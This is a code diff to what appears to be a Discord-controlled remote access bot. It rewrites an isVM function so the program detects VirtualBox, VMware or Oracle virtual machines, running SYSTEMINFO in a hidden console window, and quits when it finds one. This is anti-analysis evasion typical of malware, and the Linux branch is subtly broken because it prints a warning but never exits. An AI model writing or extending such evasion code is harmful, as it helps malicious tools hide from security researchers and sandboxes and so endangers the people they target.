@@ -2,6 +2,7 @@ import discord
 from discord.ext import commands
 import os
 import subprocess as sp
+import subprocess
 import requests
 import random
 import platform
@@ -31,13 +32,25 @@ CREDENTIALS_ID = {CREDENTIALS_ID}
 client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)
 
 def isVM():
-    try:
-        if hasattr(sys, 'real_prefix'):
-            return True
-        else:
-            return False
-    except Exception as e:
-        print(e)
+    op = sys.platform
+    if op == "linux":
+        n = os.popen("hostnamectl | grep oracle").read()
+        if "oracle" in n:
+            print("this program cant be ran on VM")
+
+    if op == "win32":
+        rules = ['Virtualbox', 'vmbox', 'vmware']
+        command = subprocess.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=subprocess.PIPE,
+                                    stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
+                                    creationflags=0x08000000)
+        out, err = command.communicate()
+        command.wait()
+        for rule in rules:
+            if re.search(rule, out, re.IGNORECASE):
+                # print(re.search(rule, out, re.IGNORECASE))
+                print("this program cant be ran on VM")
+                sys.exit()
+        print("Continuing..")
 
 def isAdmin():
     try:
